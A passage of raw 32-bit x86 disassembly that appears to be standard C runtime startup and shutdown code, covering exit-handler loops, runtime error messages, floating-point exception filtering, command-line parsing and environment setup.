  422bb0:	push   DWORD PTR [esp+0x4]
  422bb4:	call   DWORD PTR ds:0x42802c
  422bba:	int3   
  422bbb:	push   0x8
  422bbd:	call   0x423a6f
  422bc2:	pop    ecx
  422bc3:	ret    
  422bc4:	push   0x8
  422bc6:	call   0x4239db
  422bcb:	pop    ecx
  422bcc:	ret    
  422bcd:	mov    eax,ds:0x45d270
  422bd2:	test   eax,eax
  422bd4:	je     0x422bd8
  422bd6:	call   eax
  422bd8:	push   esi
  422bd9:	push   edi
  422bda:	mov    ecx,0x42a00c
  422bdf:	mov    edi,0x42a018
  422be4:	xor    eax,eax
  422be6:	cmp    ecx,edi
  422be8:	mov    esi,ecx
  422bea:	jae    0x422c03
  422bec:	test   eax,eax
  422bee:	jne    0x422c2f
  422bf0:	mov    ecx,DWORD PTR [esi]
  422bf2:	test   ecx,ecx
  422bf4:	je     0x422bf8
  422bf6:	call   ecx
  422bf8:	add    esi,0x4
  422bfb:	cmp    esi,edi
  422bfd:	jb     0x422bec
  422bff:	test   eax,eax
  422c01:	jne    0x422c2f
  422c03:	push   0x4236fb
  422c08:	call   0x423b80
  422c0d:	mov    esi,0x42a000
  422c12:	mov    eax,esi
  422c14:	mov    edi,0x42a008
  422c19:	cmp    eax,edi
  422c1b:	pop    ecx
  422c1c:	jae    0x422c2d
  422c1e:	mov    eax,DWORD PTR [esi]
  422c20:	test   eax,eax
  422c22:	je     0x422c26
  422c24:	call   eax
  422c26:	add    esi,0x4
  422c29:	cmp    esi,edi
  422c2b:	jb     0x422c1e
  422c2d:	xor    eax,eax
  422c2f:	pop    edi
  422c30:	pop    esi
  422c31:	ret    
  422c32:	push   ebp
  422c33:	mov    ebp,esp
  422c35:	push   esi
  422c36:	push   edi
  422c37:	push   0x8
  422c39:	call   0x423a6f
  422c3e:	xor    esi,esi
  422c40:	inc    esi
  422c41:	cmp    DWORD PTR ds:0x45cb04,esi
  422c47:	pop    ecx
  422c48:	jne    0x422c5a
  422c4a:	push   DWORD PTR [ebp+0x8]
  422c4d:	call   DWORD PTR ds:0x428034
  422c53:	push   eax
  422c54:	call   DWORD PTR ds:0x428030
  422c5a:	cmp    DWORD PTR [ebp+0xc],0x0
  422c5e:	mov    al,BYTE PTR [ebp+0x10]
  422c61:	mov    DWORD PTR ds:0x45cb00,esi
  422c67:	mov    ds:0x45cafc,al
  422c6c:	jne    0x422cc0
  422c6e:	mov    ecx,DWORD PTR ds:0x45d268
  422c74:	test   ecx,ecx
  422c76:	je     0x422ca1
  422c78:	mov    eax,ds:0x45d264
  422c7d:	sub    eax,0x4
  422c80:	cmp    eax,ecx
  422c82:	jmp    0x422c9a
  422c84:	mov    eax,DWORD PTR [eax]
  422c86:	test   eax,eax
  422c88:	je     0x422c8c
  422c8a:	call   eax
  422c8c:	mov    eax,ds:0x45d264
  422c91:	sub    eax,0x4
  422c94:	cmp    eax,DWORD PTR ds:0x45d268
  422c9a:	mov    ds:0x45d264,eax
  422c9f:	jae    0x422c84
  422ca1:	mov    eax,0x42a01c
  422ca6:	mov    esi,0x42a020
  422cab:	cmp    eax,esi
  422cad:	mov    edi,eax
  422caf:	jae    0x422cc0
  422cb1:	mov    eax,DWORD PTR [edi]
  422cb3:	test   eax,eax
  422cb5:	je     0x422cb9
  422cb7:	call   eax
  422cb9:	add    edi,0x4
  422cbc:	cmp    edi,esi
  422cbe:	jb     0x422cb1
  422cc0:	mov    eax,0x42a024
  422cc5:	mov    esi,0x42a028
  422cca:	cmp    eax,esi
  422ccc:	mov    edi,eax
  422cce:	jae    0x422cdf
  422cd0:	mov    eax,DWORD PTR [edi]
  422cd2:	test   eax,eax
  422cd4:	je     0x422cd8
  422cd6:	call   eax
  422cd8:	add    edi,0x4
  422cdb:	cmp    edi,esi
  422cdd:	jb     0x422cd0
  422cdf:	cmp    DWORD PTR [ebp+0x10],0x0
  422ce3:	pop    edi
  422ce4:	pop    esi
  422ce5:	je     0x422cf0
  422ce7:	push   0x8
  422ce9:	call   0x4239db
  422cee:	jmp    0x422d02
  422cf0:	push   DWORD PTR [ebp+0x8]
  422cf3:	mov    DWORD PTR ds:0x45cb04,0x1
  422cfd:	call   0x422b8b
  422d02:	pop    ecx
  422d03:	pop    ebp
  422d04:	ret    
  422d05:	push   0x0
  422d07:	push   0x0
  422d09:	push   DWORD PTR [esp+0xc]
  422d0d:	call   0x422c32
  422d12:	add    esp,0xc
  422d15:	ret    
  422d16:	push   0x0
  422d18:	push   0x1
  422d1a:	push   DWORD PTR [esp+0xc]
  422d1e:	call   0x422c32
  422d23:	add    esp,0xc
  422d26:	ret    
  422d27:	push   0x1
  422d29:	push   0x0
  422d2b:	push   0x0
  422d2d:	call   0x422c32
  422d32:	add    esp,0xc
  422d35:	ret    
  422d36:	push   0x1
  422d38:	push   0x1
  422d3a:	push   0x0
  422d3c:	call   0x422c32
  422d41:	add    esp,0xc
  422d44:	ret    
  422d45:	push   ebp
  422d46:	mov    ebp,esp
  422d48:	sub    esp,0x10c
  422d4e:	mov    eax,ds:0x45c430
  422d53:	xor    eax,DWORD PTR [ebp+0x4]
  422d56:	mov    ecx,DWORD PTR [ebp+0x8]
  422d59:	push   ebx
  422d5a:	push   esi
  422d5b:	mov    DWORD PTR [ebp-0x4],eax
  422d5e:	xor    edx,edx
  422d60:	push   edi
  422d61:	xor    eax,eax
  422d63:	cmp    ecx,DWORD PTR [eax*8+0x45c1c8]
  422d6a:	je     0x422d72
  422d6c:	inc    eax
  422d6d:	cmp    eax,0x12
  422d70:	jb     0x422d63
  422d72:	mov    esi,eax
  422d74:	shl    esi,0x3
  422d77:	cmp    ecx,DWORD PTR [esi+0x45c1c8]
  422d7d:	jne    0x422ea6
  422d83:	mov    eax,ds:0x45cabc
  422d88:	cmp    eax,0x1
  422d8b:	je     0x422e81
  422d91:	cmp    eax,edx
  422d93:	jne    0x422da2
  422d95:	cmp    DWORD PTR ds:0x45c1c4,0x1
  422d9c:	je     0x422e81
  422da2:	cmp    ecx,0xfc
  422da8:	je     0x422ea6
  422dae:	push   0x104
  422db3:	lea    eax,[ebp-0x10c]
  422db9:	push   eax
  422dba:	push   edx
  422dbb:	mov    BYTE PTR [ebp-0x8],dl
  422dbe:	call   DWORD PTR ds:0x428040
  422dc4:	test   eax,eax
  422dc6:	jne    0x422ddb
  422dc8:	lea    eax,[ebp-0x10c]
  422dce:	push   0x42848c
  422dd3:	push   eax
  422dd4:	call   0x423c90
  422dd9:	pop    ecx
  422dda:	pop    ecx
  422ddb:	lea    eax,[ebp-0x10c]
  422de1:	push   eax
  422de2:	lea    edi,[ebp-0x10c]
  422de8:	call   0x423ec0
  422ded:	inc    eax
  422dee:	cmp    eax,0x3c
  422df1:	pop    ecx
  422df2:	jbe    0x422e1d
  422df4:	lea    eax,[ebp-0x10c]
  422dfa:	push   eax
  422dfb:	call   0x423ec0
  422e00:	mov    edi,eax
  422e02:	lea    eax,[ebp-0x10c]
  422e08:	sub    eax,0x3b
  422e0b:	push   0x3
  422e0d:	add    edi,eax
  422e0f:	push   0x428488
  422e14:	push   edi
  422e15:	call   0x423d90
  422e1a:	add    esp,0x10
  422e1d:	push   edi
  422e1e:	call   0x423ec0
  422e23:	push   DWORD PTR [esi+0x45c1cc]
  422e29:	mov    ebx,eax
  422e2b:	call   0x423ec0
  422e30:	lea    eax,[ebx+eax*1+0x1c]
  422e34:	pop    ecx
  422e35:	add    eax,0x3
  422e38:	pop    ecx
  422e39:	and    eax,0xfffffffc
  422e3c:	call   0x423900
  422e41:	mov    ebx,esp
  422e43:	push   0x42846c
  422e48:	push   ebx
  422e49:	call   0x423c90
  422e4e:	push   edi
  422e4f:	push   ebx
  422e50:	call   0x423ca0
  422e55:	push   0x428468
  422e5a:	push   ebx
  422e5b:	call   0x423ca0
  422e60:	push   DWORD PTR [esi+0x45c1cc]
  422e66:	push   ebx
  422e67:	call   0x423ca0
  422e6c:	push   0x12010
  422e71:	push   0x428440
  422e76:	push   ebx
  422e77:	call   0x423b92
  422e7c:	add    esp,0x2c
  422e7f:	jmp    0x422ea6
  422e81:	push   edx
  422e82:	lea    eax,[ebp+0x8]
  422e85:	push   eax
  422e86:	lea    esi,[esi+0x45c1cc]
  422e8c:	push   DWORD PTR [esi]
  422e8e:	call   0x423ec0
  422e93:	pop    ecx
  422e94:	push   eax
  422e95:	push   DWORD PTR [esi]
  422e97:	push   0xfffffff4
  422e99:	call   DWORD PTR ds:0x42803c
  422e9f:	push   eax
  422ea0:	call   DWORD PTR ds:0x428038
  422ea6:	lea    esp,[ebp-0x118]
  422eac:	mov    ecx,DWORD PTR [ebp-0x4]
  422eaf:	xor    ecx,DWORD PTR [ebp+0x4]
  422eb2:	call   0x423f7c
  422eb7:	pop    edi
  422eb8:	pop    esi
  422eb9:	pop    ebx
  422eba:	leave  
  422ebb:	ret    
  422ebc:	mov    eax,ds:0x45cabc
  422ec1:	cmp    eax,0x1
  422ec4:	je     0x422ed3
  422ec6:	test   eax,eax
  422ec8:	jne    0x422ef4
  422eca:	cmp    DWORD PTR ds:0x45c1c4,0x1
  422ed1:	jne    0x422ef4
  422ed3:	push   0xfc
  422ed8:	call   0x422d45
  422edd:	mov    eax,ds:0x45cb08
  422ee2:	test   eax,eax
  422ee4:	pop    ecx
  422ee5:	je     0x422ee9
  422ee7:	call   eax
  422ee9:	push   0xff
  422eee:	call   0x422d45
  422ef3:	pop    ecx
  422ef4:	ret    
  422ef5:	push   ebp
  422ef6:	mov    ebp,esp
  422ef8:	push   ecx
  422ef9:	push   ebx
  422efa:	push   esi
  422efb:	push   edi
  422efc:	call   0x42375d
  422f01:	mov    edi,DWORD PTR [ebp+0x8]
  422f04:	mov    esi,eax
  422f06:	mov    edx,DWORD PTR [esi+0x54]
  422f09:	mov    eax,ds:0x45c2dc
  422f0e:	mov    ecx,edx
  422f10:	cmp    DWORD PTR [ecx],edi
  422f12:	je     0x422f21
  422f14:	lea    ebx,[eax+eax*2]
  422f17:	add    ecx,0xc
  422f1a:	lea    ebx,[edx+ebx*4]
  422f1d:	cmp    ecx,ebx
  422f1f:	jb     0x422f10
  422f21:	lea    eax,[eax+eax*2]
  422f24:	lea    eax,[edx+eax*4]
  422f27:	cmp    ecx,eax
  422f29:	jae    0x422f2f
  422f2b:	cmp    DWORD PTR [ecx],edi
  422f2d:	je     0x422f31
  422f2f:	xor    ecx,ecx
  422f31:	test   ecx,ecx
  422f33:	je     0x42304b
  422f39:	mov    ebx,DWORD PTR [ecx+0x8]
  422f3c:	test   ebx,ebx
  422f3e:	mov    DWORD PTR [ebp+0x8],ebx
  422f41:	je     0x42304b
  422f47:	cmp    ebx,0x5
  422f4a:	jne    0x422f58
  422f4c:	and    DWORD PTR [ecx+0x8],0x0
  422f50:	xor    eax,eax
  422f52:	inc    eax
  422f53:	jmp    0x423054
  422f58:	cmp    ebx,0x1
  422f5b:	je     0x423046
  422f61:	mov    eax,DWORD PTR [esi+0x58]
  422f64:	mov    DWORD PTR [ebp-0x4],eax
  422f67:	mov    eax,DWORD PTR [ebp+0xc]
  422f6a:	mov    DWORD PTR [esi+0x58],eax
  422f6d:	mov    eax,DWORD PTR [ecx+0x4]
  422f70:	cmp    eax,0x8
  422f73:	jne    0x423038
  422f79:	mov    edx,DWORD PTR ds:0x45c2d0
  422f7f:	mov    eax,ds:0x45c2d4
  422f84:	add    eax,edx
  422f86:	cmp    edx,eax
  422f88:	jge    0x422fb1
  422f8a:	lea    eax,[edx+edx*2]
  422f8d:	shl    eax,0x2
  422f90:	mov    edi,DWORD PTR [esi+0x54]
  422f93:	and    DWORD PTR [eax+edi*1+0x8],0x0
  422f98:	mov    edi,DWORD PTR ds:0x45c2d0
  422f9e:	mov    ebx,DWORD PTR ds:0x45c2d4
  422fa4:	inc    edx
  422fa5:	add    ebx,edi
  422fa7:	add    eax,0xc
  422faa:	cmp    edx,ebx
  422fac:	jl     0x422f90
  422fae:	mov    ebx,DWORD PTR [ebp+0x8]
  422fb1:	mov    ecx,DWORD PTR [ecx]
  422fb3:	cmp    ecx,0xc000008e
  422fb9:	mov    edi,DWORD PTR [esi+0x5c]
  422fbc:	jne    0x422fc7
  422fbe:	mov    DWORD PTR [esi+0x5c],0x83
  422fc5:	jmp    0x42302b
  422fc7:	cmp    ecx,0xc0000090
  422fcd:	jne    0x422fd8
  422fcf:	mov    DWORD PTR [esi+0x5c],0x81
  422fd6:	jmp    0x42302b
  422fd8:	cmp    ecx,0xc0000091
  422fde:	jne    0x422fe9
  422fe0:	mov    DWORD PTR [esi+0x5c],0x84
  422fe7:	jmp    0x42302b
  422fe9:	cmp    ecx,0xc0000093
  422fef:	jne    0x422ffa
  422ff1:	mov    DWORD PTR [esi+0x5c],0x85
  422ff8:	jmp    0x42302b
  422ffa:	cmp    ecx,0xc000008d
  423000:	jne    0x42300b
  423002:	mov    DWORD PTR [esi+0x5c],0x82
  423009:	jmp    0x42302b
  42300b:	cmp    ecx,0xc000008f
  423011:	jne    0x42301c
  423013:	mov    DWORD PTR [esi+0x5c],0x86
  42301a:	jmp    0x42302b
  42301c:	cmp    ecx,0xc0000092
  423022:	jne    0x42302b
  423024:	mov    DWORD PTR [esi+0x5c],0x8a
  42302b:	push   DWORD PTR [esi+0x5c]
  42302e:	push   0x8
  423030:	call   ebx
  423032:	pop    ecx
  423033:	mov    DWORD PTR [esi+0x5c],edi
  423036:	jmp    0x42303f
  423038:	and    DWORD PTR [ecx+0x8],0x0
  42303c:	push   eax
  42303d:	call   ebx
  42303f:	mov    eax,DWORD PTR [ebp-0x4]
  423042:	pop    ecx
  423043:	mov    DWORD PTR [esi+0x58],eax
  423046:	or     eax,0xffffffff
  423049:	jmp    0x423054
  42304b:	push   DWORD PTR [ebp+0xc]
  42304e:	call   DWORD PTR ds:0x428044
  423054:	pop    edi
  423055:	pop    esi
  423056:	pop    ebx
  423057:	leave  
  423058:	ret    
  423059:	cmp    DWORD PTR ds:0x45d26c,0x0
  423060:	jne    0x423067
  423062:	call   0x42449c
  423067:	push   esi
  423068:	mov    esi,DWORD PTR ds:0x45d274
  42306e:	test   esi,esi
  423070:	jne    0x423079
  423072:	mov    esi,0x4284a3
  423077:	jmp    0x4230be
  423079:	mov    al,BYTE PTR [esi]
  42307b:	cmp    al,0x22
  42307d:	jne    0x4230a7
  42307f:	inc    esi
  423080:	mov    al,BYTE PTR [esi]
  423082:	cmp    al,0x22
  423084:	je     0x4230b7
  423086:	test   al,al
  423088:	je     0x4230a0
  42308a:	movzx  eax,al
  42308d:	push   eax
  42308e:	call   0x423fbb
  423093:	test   eax,eax
  423095:	pop    ecx
  423096:	je     0x423099
  423098:	inc    esi
  423099:	inc    esi
  42309a:	mov    al,BYTE PTR [esi]
  42309c:	cmp    al,0x22
  42309e:	jne    0x423086
  4230a0:	cmp    BYTE PTR [esi],0x22
  4230a3:	jne    0x4230b8
  4230a5:	jmp    0x4230b7
  4230a7:	cmp    al,0x20
  4230a9:	jbe    0x4230b8
  4230ab:	inc    esi
  4230ac:	cmp    BYTE PTR [esi],0x20
  4230af:	ja     0x4230ab
  4230b1:	jmp    0x4230b8
  4230b3:	cmp    al,0x20
  4230b5:	ja     0x4230be
  4230b7:	inc    esi
  4230b8:	mov    al,BYTE PTR [esi]
  4230ba:	test   al,al
  4230bc:	jne    0x4230b3
  4230be:	mov    eax,esi
  4230c0:	pop    esi
  4230c1:	ret    
  4230c2:	push   ebx
  4230c3:	xor    ebx,ebx
  4230c5:	cmp    DWORD PTR ds:0x45d26c,ebx
  4230cb:	push   esi
  4230cc:	push   edi
  4230cd:	jne    0x4230d4
  4230cf:	call   0x42449c
  4230d4:	mov    esi,DWORD PTR ds:0x45cab4
  4230da:	xor    edi,edi
  4230dc:	cmp    esi,ebx
  4230de:	jne    0x4230f2
  4230e0:	jmp    0x423112
  4230e2:	cmp    al,0x3d
  4230e4:	je     0x4230e7
  4230e6:	inc    edi
  4230e7:	push   esi
  4230e8:	call   0x423ec0
  4230ed:	pop    ecx
  4230ee:	lea    esi,[esi+eax*1+0x1]
  4230f2:	mov    al,BYTE PTR [esi]
  4230f4:	cmp    al,bl
  4230f6:	jne    0x4230e2
  4230f8:	lea    eax,[edi*4+0x4]
  4230ff:	push   eax
  423100:	call   0x4245d2
  423105:	mov    edi,eax
  423107:	cmp    edi,ebx
  423109:	pop    ecx
  42310a:	mov    DWORD PTR ds:0x45cae4,edi
  423110:	jne    0x423117
  423112:	or     eax,0xffffffff
  423115:	jmp    0x42316f
  423117:	mov    esi,DWORD PTR ds:0x45cab4
  42311d:	push   ebp
  42311e:	jmp    0x42314a
  423120:	push   esi
  423121:	call   0x423ec0
  423126:	mov    ebp,eax
  423128:	inc    ebp
  423129:	cmp    BYTE PTR [esi],0x3d
  42312c:	pop    ecx
  42312d:	je     0x423148
  42312f:	push   ebp
  423130:	call   0x4245d2
  423135:	cmp    eax,ebx
  423137:	pop    ecx
  423138:	mov    DWORD PTR [edi],eax
  42313a:	je     0x423173
  42313c:	push   esi
  42313d:	push   eax
  42313e:	call   0x423c90
  423143:	pop    ecx
  423144:	pop    ecx
  423145:	add    edi,0x4
  423148:	add    esi,ebp
  42314a:	cmp    BYTE PTR [esi],bl
  42314c:	jne    0x423120
  42314e:	push   DWORD PTR ds:0x45cab4
  423154:	call   0x4244ba
  423159:	mov    DWORD PTR ds:0x45cab4,ebx
  42315f:	mov    DWORD PTR [edi],ebx
  423161:	mov    DWORD PTR ds:0x45d260,0x1
  42316b:	xor    eax,eax
  42316d:	pop    ecx
  42316e:	pop    ebp
  42316f:	pop    edi
  423170:	pop    esi
  423171:	pop    ebx
  423172:	ret    
  423173:	push   DWORD PTR ds:0x45cae4
  423179:	call   0x4244ba
  42317e:	mov    DWORD PTR ds:0x45cae4,ebx
  423184:	or     eax,0xffffffff
  423187:	jmp    0x42316d
  423189:	push   ebp
  42318a:	mov    ebp,esp
  42318c:	push   ecx
  42318d:	push   ebx
  42318e:	mov    ebx,DWORD PTR [ebp+0xc]
  423191:	xor    edx,edx
  423193:	cmp    DWORD PTR [ebp+0x8],edx
  423196:	push   edi
  423197:	mov    DWORD PTR [esi],edx
  423199:	mov    edi,ecx
  42319b:	mov    DWORD PTR [ebx],0x1
  4231a1:	je     0x4231ac
  4231a3:	mov    ecx,DWORD PTR [ebp+0x8]
  4231a6:	add    DWORD PTR [ebp+0x8],0x4
  4231aa:	mov    DWORD PTR [ecx],edi
  4231ac:	cmp    BYTE PTR [eax],0x22
  4231af:	jne    0x4231bf
  4231b1:	xor    ecx,ecx
  4231b3:	test   edx,edx
  4231b5:	sete   cl
  4231b8:	inc    eax
  4231b9:	mov    edx,ecx
  4231bb:	mov    cl,0x22
  4231bd:	jmp    0x4231ec
  4231bf:	inc    DWORD PTR [esi]
  4231c1:	test   edi,edi
  4231c3:	je     0x4231ca
  4231c5:	mov    cl,BYTE PTR [eax]
  4231c7:	mov    BYTE PTR [edi],cl
  4231c9:	inc    edi
  4231ca:	mov    cl,BYTE PTR [eax]
  4231cc:	movzx  ebx,cl
  4231cf:	inc    eax
  4231d0:	test   BYTE PTR [ebx+0x45cf21],0x4
  4231d7:	je     0x4231e5
  4231d9:	inc    DWORD PTR [esi]
  4231db:	test   edi,edi
  4231dd:	je     0x4231e4
  4231df:	mov    bl,BYTE PTR [eax]
  4231e1:	mov    BYTE PTR [edi],bl
  4231e3:	inc    edi
  4231e4:	inc    eax
  4231e5:	test   cl,cl
  4231e7:	mov    ebx,DWORD PTR [ebp+0xc]
  4231ea:	je     0x42321e
  4231ec:	test   edx,edx
  4231ee:	jne    0x4231ac
  4231f0:	cmp    cl,0x20
  4231f3:	je     0x4231fa
  4231f5:	cmp    cl,0x9
  4231f8:	jne    0x4231ac
  4231fa:	test   edi,edi
  4231fc:	je     0x423202
  4231fe:	and    BYTE PTR [edi-0x1],0x0
  423202:	and    DWORD PTR [ebp-0x4],0x0
  423206:	cmp    BYTE PTR [eax],0x0
  423209:	je     0x4232e5
  42320f:	mov    cl,BYTE PTR [eax]
  423211:	cmp    cl,0x20
  423214:	je     0x42321b
  423216:	cmp    cl,0x9
  423219:	jne    0x423221
  42321b:	inc    eax
  42321c:	jmp    0x42320f
  42321e:	dec    eax
  42321f:	jmp    0x423202
  423221:	cmp    BYTE PTR [eax],0x0
  423224:	je     0x4232e5
  42322a:	cmp    DWORD PTR [ebp+0x8],0x0
  42322e:	je     0x423239
  423230:	mov    ecx,DWORD PTR [ebp+0x8]
  423233:	add    DWORD PTR [ebp+0x8],0x4
  423237:	mov    DWORD PTR [ecx],edi
  423239:	inc    DWORD PTR [ebx]
  42323b:	xor    ebx,ebx
  42323d:	inc    ebx
  42323e:	xor    edx,edx
  423240:	jmp    0x423244
  423242:	inc    eax
  423243:	inc    edx
  423244:	cmp    BYTE PTR [eax],0x5c
  423247:	je     0x423242
  423249:	cmp    BYTE PTR [eax],0x22
  42324c:	jne    0x423274
  42324e:	test   dl,0x1
  423251:	jne    0x423272
  423253:	cmp    DWORD PTR [ebp-0x4],0x0
  423257:	je     0x423265
  423259:	lea    ecx,[eax+0x1]
  42325c:	cmp    BYTE PTR [ecx],0x22
  42325f:	jne    0x423265
  423261:	mov    eax,ecx
  423263:	jmp    0x423267
  423265:	xor    ebx,ebx
  423267:	xor    ecx,ecx
  423269:	cmp    DWORD PTR [ebp-0x4],ecx
  42326c:	sete   cl
  42326f:	mov    DWORD PTR [ebp-0x4],ecx
  423272:	shr    edx,1
  423274:	test   edx,edx
  423276:	je     0x423285
  423278:	test   edi,edi
  42327a:	je     0x423280
  42327c:	mov    BYTE PTR [edi],0x5c
  42327f:	inc    edi
  423280:	inc    DWORD PTR [esi]
  423282:	dec    edx
  423283:	jne    0x423278
  423285:	mov    cl,BYTE PTR [eax]
  423287:	test   cl,cl
  423289:	je     0x4232d3
  42328b:	cmp    DWORD PTR [ebp-0x4],0x0
  42328f:	jne    0x42329b
  423291:	cmp    cl,0x20
  423294:	je     0x4232d3
  423296:	cmp    cl,0x9
  423299:	je     0x4232d3
  42329b:	test   ebx,ebx
  42329d:	je     0x4232cd
  42329f:	test   edi,edi
  4232a1:	je     0x4232bc
  4232a3:	movzx  edx,cl
  4232a6:	test   BYTE PTR [edx+0x45cf21],0x4
  4232ad:	je     0x4232b5
  4232af:	mov    BYTE PTR [edi],cl
  4232b1:	inc    edi
  4232b2:	inc    eax
  4232b3:	inc    DWORD PTR [esi]
  4232b5:	mov    cl,BYTE PTR [eax]
  4232b7:	mov    BYTE PTR [edi],cl
  4232b9:	inc    edi
  4232ba:	jmp    0x4232cb
  4232bc:	movzx  ecx,cl
  4232bf:	test   BYTE PTR [ecx+0x45cf21],0x4
  4232c6:	je     0x4232cb
  4232c8:	inc    eax
  4232c9:	inc    DWORD PTR [esi]
  4232cb:	inc    DWORD PTR [esi]
  4232cd:	inc    eax
  4232ce:	jmp    0x42323b
  4232d3:	test   edi,edi
  4232d5:	je     0x4232db
  4232d7:	and    BYTE PTR [edi],0x0
  4232da:	inc    edi
  4232db:	inc    DWORD PTR [esi]
  4232dd:	mov    ebx,DWORD PTR [ebp+0xc]
  4232e0:	jmp    0x423206
  4232e5:	mov    eax,DWORD PTR [ebp+0x8]
  4232e8:	test   eax,eax
  4232ea:	je     0x4232ef
  4232ec:	and    DWORD PTR [eax],0x0
  4232ef:	inc    DWORD PTR [ebx]
  4232f1:	pop    edi
  4232f2:	pop    ebx
  4232f3:	leave  
  4232f4:	ret    
  4232f5:	push   ebp
  4232f6:	mov    ebp,esp
  4232f8:	push   ecx
  4232f9:	push   ecx
  4232fa:	push   ebx
  4232fb:	push   esi
  4232fc:	push   edi
  4232fd:	xor    edi,edi
  4232ff:	cmp    DWORD PTR ds:0x45d26c,edi
  423305:	jne    0x42330c
  423307:	call   0x42449c
  42330c:	and    BYTE PTR ds:0x45cc14,0x0
  423313:	push   0x104
  423318:	mov    esi,0x45cb10
  42331d:	push   esi
  42331e:	push   edi
  42331f:	call   DWORD PTR ds:0x428040
  423325:	mov    eax,ds:0x45d274
  42332a:	cmp    eax,edi
  42332c:	mov    DWORD PTR ds:0x45caf4,esi
  423332:	je     0x42333b
  423334:	cmp    BYTE PTR [eax],0x0
  423337:	mov    ebx,eax
  423339:	jne    0x42333d
  42333b:	mov    ebx,esi
  42333d:	lea    eax,[ebp-0x4]
  423340:	push   eax
  423341:	push   edi
  423342:	lea    esi,[ebp-0x8]
  423345:	xor    ecx,ecx
  423347:	mov    eax,ebx
  423349:	call   0x423189
  42334e:	mov    esi,DWORD PTR [ebp-0x4]
  423351:	mov    eax,DWORD PTR [ebp-0x8]
  423354:	shl    esi,0x2
  423357:	add    eax,esi
  423359:	push   eax
  42335a:	call   0x4245d2
  42335f:	mov    edi,eax
  423361:	add    esp,0xc
  423364:	test   edi,edi
  423366:	jne    0x42336d
  423368:	or     eax,0xffffffff
  42336b:	jmp    0x423392
  42336d:	lea    eax,[ebp-0x4]
  423370:	push   eax
  423371:	lea    ecx,[esi+edi*1]
  423374:	push   edi
  423375:	lea    esi,[ebp-0x8]
  423378:	mov    eax,ebx
  42337a:	call   0x423189
  42337f:	mov    eax,DWORD PTR [ebp-0x4]
  423382:	dec    eax
  423383:	pop    ecx
  423384:	mov    ds:0x45cad8,eax
  423389:	pop    ecx
  42338a:	mov    DWORD PTR ds:0x45cadc,edi
  423390:	xor    eax,eax
  423392:	pop    edi
  423393:	pop    esi
  423394:	pop    ebx
  423395:	leave  
  423396:	ret    
  423397:	push   ecx
  423398:	push   ecx
  423399:	mov    eax,ds:0x45cc18
  42339e:	push   ebx
  42339f:	push   ebp
  4233a0:	push   esi
  4233a1:	push   edi
  4233a2:	mov    edi,DWORD PTR ds:0x428058
  4233a8:	xor    ebx,ebx
  4233aa:	xor    esi,esi
  4233ac:	cmp    eax,ebx
  4233ae:	push   0x2
  4233b0:	pop    ebp
  4233b1:	jne    0x4233e0
  4233b3:	call   edi
  4233b5:	mov    esi,eax
  4233b7:	cmp    esi,ebx
  4233b9:	je     0x4233c7
  4233bb:	mov    DWORD PTR ds:0x45cc18,0x1
  4233c5:	jmp    0x4233e5
  4233c7:	call   DWORD PTR ds:0x428014
  4233cd:	cmp    eax,0x78
  4233d0:	jne    0x4233db
  4233d2:	mov    eax,ebp
  4233d4:	mov    ds:0x45cc18,eax
  4233d9:	jmp    0x4233e0
  4233db:	mov    eax,ds:0x45cc18
  4233e0:	cmp    eax,0x1
  4233e3:	jne    0x423462
  4233e5:	cmp    esi,ebx
  4233e7:	jne    0x4233f1
  4233e9:	call   edi
  4233eb:	mov    esi,eax
  4233ed:	cmp    esi,ebx
  4233ef:	je     0x42346a
  4233f1:	cmp    WORD PTR [esi],bx
  4233f4:	mov    eax,esi
  4233f6:	je     0x423406
  4233f8:	add    eax,ebp
  4233fa:	cmp    WORD PTR [eax],bx
  4233fd:	jne    0x4233f8
  4233ff:	add    eax,ebp
  423401:	cmp    WORD PTR [eax],bx
  423404:	jne    0x4233f8
  423406:	mov    edi,DWORD PTR ds:0x428054
  42340c:	push   ebx
  42340d:	push   ebx
  42340e:	push   ebx
  42340f:	sub    eax,esi
  423411:	push   ebx
  423412:	sar    eax,1
  423414:	inc    eax
  423415:	push   eax
  423416:	push   esi
  423417:	push   ebx
  423418:	push   ebx
  423419:	mov    DWORD PTR [esp+0x34],eax
  42341d:	call   edi
  42341f:	mov    ebp,eax
  423421:	cmp    ebp,ebx
  423423:	je     0x423457
  423425:	push   ebp
  423426:	call   0x4245d2
  42342b:	cmp    eax,ebx
  42342d:	pop    ecx
  42342e:	mov    DWORD PTR [esp+0x10],eax
  423432:	je     0x423457
  423434:	push   ebx
  423435:	push   ebx
  423436:	push   ebp
  423437:	push   eax
  423438:	push   DWORD PTR [esp+0x24]
  42343c:	push   esi
  42343d:	push   ebx
  42343e:	push   ebx
  42343f:	call   edi
  423441:	test   eax,eax
  423443:	jne    0x423453
  423445:	push   DWORD PTR [esp+0x10]
  423449:	call   0x4244ba
  42344e:	pop    ecx
  42344f:	mov    DWORD PTR [esp+0x10],ebx
  423453:	mov    ebx,DWORD PTR [esp+0x10]
  423457:	push   esi
  423458:	call   DWORD PTR ds:0x428050
  42345e:	mov    eax,ebx
  423460:	jmp    0x4234b2
  423462:	cmp    eax,ebp
  423464:	je     0x42346e
  423466:	cmp    eax,ebx
  423468:	je     0x42346e
  42346a:	xor    eax,eax
  42346c:	jmp    0x4234b2
  42346e:	call   DWORD PTR ds:0x42804c
  423474:	mov    esi,eax
  423476:	cmp    esi,ebx
  423478:	je     0x42346a
  42347a:	cmp    BYTE PTR [esi],bl
  42347c:	je     0x423488
  42347e:	inc    eax
  42347f:	cmp    BYTE PTR [eax],bl
  423481:	jne    0x42347e
  423483:	inc    eax
  423484:	cmp    BYTE PTR [eax],bl
  423486:	jne    0x42347e
  423488:	sub    eax,esi
  42348a:	inc    eax
  42348b:	mov    ebp,eax
  42348d:	push   ebp
  42348e:	call   0x4245d2
  423493:	mov    edi,eax
  423495:	cmp    edi,ebx
  423497:	pop    ecx
  423498:	jne    0x42349e
  42349a:	xor    edi,edi
  42349c:	jmp    0x4234a9
  42349e:	push   ebp
  42349f:	push   esi
  4234a0:	push   edi
  4234a1:	call   0x4245f0
  4234a6:	add    esp,0xc
  4234a9:	push   esi
  4234aa:	call   DWORD PTR ds:0x428048
  4234b0:	mov    eax,edi
  4234b2:	pop    edi
  4234b3:	pop    esi
  4234b4:	pop    ebp
  4234b5:	pop    ebx
  4234b6:	pop    ecx
  4234b7:	pop    ecx
  4234b8:	ret    
  4234b9:	sub    esp,0x48
  4234bc:	push   ebx
  4234bd:	mov    ebx,0x480
  4234c2:	push   ebx
  4234c3:	call   0x4245d2
  4234c8:	test   eax,eax
  4234ca:	pop    ecx
